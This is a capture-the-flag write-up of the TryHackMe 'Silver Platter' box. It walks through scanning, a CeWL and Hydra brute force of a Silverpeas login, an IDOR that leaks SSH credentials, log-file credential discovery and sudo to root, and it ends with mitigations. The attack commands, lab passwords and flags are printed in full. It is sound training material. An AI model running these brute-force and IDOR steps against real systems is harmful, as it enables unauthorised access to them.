```
 ███████╗██╗██╗     ██╗   ██╗███████╗██████╗
 ██╔════╝██║██║     ██║   ██║██╔════╝██╔══██╗
 ███████╗██║██║     ██║   ██║█████╗  ██████╔╝
 ╚════██║██║██║     ╚██╗ ██╔╝██╔══╝  ██╔══██╗
 ███████║██║███████╗ ╚████╔╝ ███████╗██║  ██║
 ╚══════╝╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
 ██████╗ ██╗      █████╗ ████████╗████████╗███████╗██████╗
 ██╔══██╗██║     ██╔══██╗╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗
 ██████╔╝██║     ███████║   ██║      ██║   █████╗  ██████╔╝
 ██╔═══╝ ██║     ██╔══██║   ██║      ██║   ██╔══╝  ██╔══██╗
 ██║     ███████╗██║  ██║   ██║      ██║   ███████╗██║  ██║
 ╚═╝     ╚══════╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝
           TryHackMe: Silver Platter
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-06-16 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Medium | ⭐ **Rating:** ⭐⭐⭐☆☆

> ⏱️ ~12 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Shell / Access](#-shell--access)
- [Escalation](#-escalation)
- [Exploitation](#-exploitation)
- [Rabbit Holes](#-rabbit-holes)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)

---

## Progress Checklist

- [x] Port scan: SSH (22), HTTP (80), HTTP-proxy (8080)
- [x] Feroxbuster on port 80: static site, no useful paths
- [x] Feroxbuster on port 8080: found `/silverpeas/` login portal
- [x] Contact section on homepage → username `scr1ptkiddy` on Silverpeas
- [x] CeWL wordlist generated from homepage
- [x] Hydra brute forced Silverpeas login → `scr1ptkiddy:adipiscing`
- [x] Logged into Silverpeas: found message notification
- [x] IDOR on message ID parameter: changed ID=5 to ID=6
- [x] ID=6 leaked SSH credentials for `tim`
- [x] SSH login as `tim`: retrieved user flag
- [x] `tim` in `adm` group: read `/var/log/auth.log.2`
- [x] Auth log contained `tyler`'s Docker password in plaintext
- [x] `su tyler` with discovered password
- [x] `tyler` has full `sudo`: `sudo su` → root shell
- [x] Retrieved root flag

---

## 🛠️ Tools Used

- 🔎 RustScan + Nmap: port scanning and service detection
- 🕷️ Feroxbuster: web directory enumeration on both ports
- 📝 CeWL: custom wordlist generation from the target website
- 🐉 Hydra: HTTP POST brute force against Silverpeas login
- 🦊 Burp Suite: intercepting message ID parameter for IDOR
- 🔑 SSH: authenticated user shell

---

## ⚡ TL;DR

A contact form named a Silverpeas username. CeWL wordlist plus Hydra cracked the password. Inside Silverpeas, an IDOR on the message ID parameter exposed SSH credentials for `tim`. As `tim` (member of `adm` group), reading `/var/log/auth.log.2` revealed `tyler`'s password in a logged Docker command. Tyler has unrestricted `sudo`: one `sudo su` to root.

---

## 📖 Introduction

Today's target is **Silver Platter**: a box that opens by daring you to use rockyou.txt and then daring you to think of something better. The room explicitly tells you the password policy blocks any password in the rockyou wordlist: a hint to build a targeted wordlist from the site itself. The escalation path is equally deliberate: IDOR on internal message IDs, credentials in a log file, and a user who can `sudo` everything. The box hands the flag to you on a silver platter, but only after you've earned it through careful enumeration.

### Prerequisites

Readers are assumed to know:

- What CeWL is and why site-scraped wordlists beat generic ones in targeted attacks
- What IDOR is and how incrementing ID parameters reveals unauthorised data
- What the `adm` group grants in Ubuntu and why log file access matters
- How plaintext credentials end up in auth logs via command history

---

## 🔍 Recon

*(~0 mins into the box)*

### Port Scan

*Service and version fingerprinting via Nmap:*

```bash
rustscan -a 10.49.190.34 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV
```

| Port | Service | Version |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 |
| 80/tcp | HTTP | nginx 1.18.0 (Ubuntu): "Hack Smarter Security" |
| 8080/tcp | HTTP-proxy | Unknown: returns 404 on root |

Three ports. Port 80 runs a corporate-looking static site. Port 8080 is unidentified but responds to HTTP: worth enumerating separately.

### Web Directory Enumeration: Port 80

*Feroxbuster on port 80:*

```bash
feroxbuster -u http://10.49.190.34/ -w /usr/share/wordlists/dirb/common.txt
```

Static site assets only: no actionable PHP or admin paths. The homepage's contact section is more useful than any directory scan:

```
If you'd like to get in touch with us, please reach out to our project
manager on Silverpeas. His username is "scr1ptkiddy".
```

Username: `scr1ptkiddy` on a platform called Silverpeas.

### Web Directory Enumeration: Port 8080

*Feroxbuster on port 8080:*

```bash
feroxbuster -u http://10.49.190.34:8080/ -w /usr/share/wordlists/dirb/common.txt
```

```
302  http://10.49.190.34:8080/website    → /website/   (403 Forbidden)
302  http://10.49.190.34:8080/console    → /noredirect.html
```

Neither accessible. Manual navigation to `/silverpeas/` on port 8080 loads a Silverpeas login portal: found by trying the platform name directly.

---

## 🚪 Foothold

*(~10 mins into the box)*

### CeWL Wordlist + Hydra Brute Force

The room explicitly states passwords are checked against rockyou.txt: any password in that list is rejected by the application. This isn't a bug, it's a design choice, and it's a hint: use a wordlist that isn't rockyou.txt.

**What is CeWL?** A custom wordlist generator that spiders a target website and extracts words from the content: product names, employee names, company jargon, marketing language. These words are often used as passwords precisely because they're meaningful to the organisation and don't appear in generic wordlists.

*Generating a wordlist from the homepage:*

```bash
cewl http://10.49.190.34/ > pass.txt
# 345 words extracted
```

*Capturing the login POST request structure via Burp Suite:*

```
POST /silverpeas/AuthenticationServlet
Login=scr1ptkiddy&Password=abc&DomainId=0
Failure indicator: response redirects back to defaultLogin.jsp
```

*Brute forcing with the CeWL wordlist:*

```bash
hydra -l scr1ptkiddy -P pass.txt 10.49.190.34 -s 8080 \
  http-post-form \
  "/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:F=defaultLogin.jsp" -vV
```

```
[8080][http-post-form] host: 10.49.190.34   login: scr1ptkiddy   password: adipiscing
```

Password: `adipiscing`: a Latin placeholder word from the site's lorem ipsum content. Exactly the kind of thing that appears in CeWL output and nowhere in rockyou.txt.

### IDOR on Silverpeas Message ID

Logged into Silverpeas as `scr1ptkiddy`, a notification indicates an unread message. The message URL structure is:

```
/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=5
```

**What is IDOR here?** The `ID` parameter directly references a message record with no check that the requesting user owns that message. Incrementing to `ID=6` via Burp Suite's Repeater tab:

```
GET /silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6
```

```
Dude how do you always forget the SSH password? Use a password manager
and quit using your silly sticky notes.
Username: tim
Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```

SSH credentials for `tim`, sitting in someone else's inbox.

### Credentials Found

| Username | Password | Where Found |
| --- | --- | --- |
| `scr1ptkiddy` | `adipiscing` | Hydra + CeWL wordlist |
| `tim` | `cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol` | Silverpeas message IDOR (ID=6) |

---

## 🐚 Shell / Access

*(~20 mins into the box)*

*SSH login as `tim`:*

```bash
ssh tim@10.49.190.34
# Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```

```
tim@ip-10-49-190-34:~$ cat user.txt
THM{c4ca4238a0b923820dcc509a6f75849b}
```

`sudo -l` confirmed `tim` has no sudo rights. Time to look elsewhere.

---

## 📈 Escalation: tim → tyler → root

*(~22 mins into the box)*

### `adm` Group: Log File Access

```bash
id
# uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
```

**What does the `adm` group grant?** In Ubuntu, members of `adm` can read most files in `/var/log/`: system logs, authentication logs, and service logs that are normally restricted to root. This is intended for system administrators monitoring the box, but it also means any `adm` user can read auth logs that may contain sensitive information.

*Grepping for `tyler` across all log files:*

```bash
grep -iR tyler /var/log/
```

```
auth.log.2:Dec 13 15:40:33 silver-platter sudo: tyler : TTY=tty1 ;
PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d
-e POSTGRES_PASSWORD=_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3
```

`tyler` ran a Docker command with a PostgreSQL password passed as an environment variable flag (`-e POSTGRES_PASSWORD=_Zd_zx7N823/`). Sudo logs the entire command line: password and all. The environment variable value `_Zd_zx7N823/` is almost certainly reused as `tyler`'s system password.

### tyler → root

*Switching to `tyler`:*

```bash
su tyler
# Password: _Zd_zx7N823/
```

```
tyler@ip-10-49-190-34:~$ sudo -l
# (ALL : ALL) ALL
```

Full unrestricted sudo. One command to root:

```bash
sudo su
```

```
root@ip-10-49-190-34:~# cat root.txt
THM{098f6bcd4621d373cade4e832627b4f6}
```

---

## 💥 Exploitation

The complete attack chain:

1. **Homepage contact section** → Silverpeas username `scr1ptkiddy`
2. **CeWL** scraped homepage → 345-word custom wordlist
3. **Hydra** brute forced Silverpeas on port 8080 → `adipiscing`
4. **IDOR** on message `ID=6` → SSH credentials `tim:cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol`
5. **SSH as `tim`** → user flag
6. **`adm` group** → read `/var/log/auth.log.2` → `tyler`'s password in a Docker command
7. **`su tyler`** → full `sudo` → `sudo su` → root flag

---

## 🐇 Rabbit Holes

### Silverpeas Paths on Port 80

Before discovering port 8080, the Silverpeas login paths (`/silverpeas/`, `/silverpeas/jsp/login.jsp`, `/silverpeas/Main`) were tried on port 80. All returned 404 or empty responses. The platform was running on port 8080, not 80: a lesson in checking all open HTTP ports before concluding a service isn't present.

### rockyou.txt Against Silverpeas

The room's stated password policy is a deterrent. Trying rockyou.txt anyway: the application genuinely rejects passwords found in the list: Hydra returns zero hits against the full 14 million entries. CeWL was the correct tool from the start.

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| User | `THM{c4ca4238a0b923820dcc509a6f75849b}` | `/home/tim/user.txt` |
| Root | `THM{098f6bcd4621d373cade4e832627b4f6}` | `/root/root.txt` |

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| Username published on public homepage | Medium | Never expose internal platform usernames in public-facing contact sections |
| Weak CeWL-crackable password (`adipiscing`) | High | Site-derived words are as guessable as dictionary words; use randomly generated passwords that bear no relation to the organisation's content |
| IDOR on Silverpeas message IDs | High | Enforce server-side ownership checks on every message read request; never trust a client-supplied ID without verifying the requesting user owns that resource |
| SSH credentials sent via internal message with no encryption | High | Internal messaging systems should not be used for credential distribution; use a dedicated secrets manager or encrypted channel |
| Plaintext password in Docker `-e` flag (visible in auth log) | Critical | Use Docker secrets or environment files (`--env-file`) rather than passing credentials directly on the command line; command-line arguments appear in `ps`, `sudo` logs, and shell history |
| `tyler` has unrestricted `sudo` | High | Grant only the minimum necessary sudo permissions; unrestricted `(ALL:ALL) ALL` is equivalent to permanent root access |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** Passwords passed as command-line arguments are logged everywhere: `sudo` audit logs, shell history, `ps` output, and `/proc`. Never pass secrets via `-e`, `-p`, or similar flags in commands that get logged. Use environment files, secrets managers, or dedicated credential stores. One `grep` through auth logs shouldn't hand an attacker lateral movement.

---

## 🔁 If I Did It Again

Try `/silverpeas/` on port 8080 manually before running Feroxbuster on either port: the platform name was given on the homepage and the URL path is predictable. Also enumerate port 8080 with Feroxbuster simultaneously with port 80 rather than sequentially, cutting discovery time in half.

---

## 🔚 Changelog

*Last updated: 2026-06-16*

---

[↑ Back to top](#)
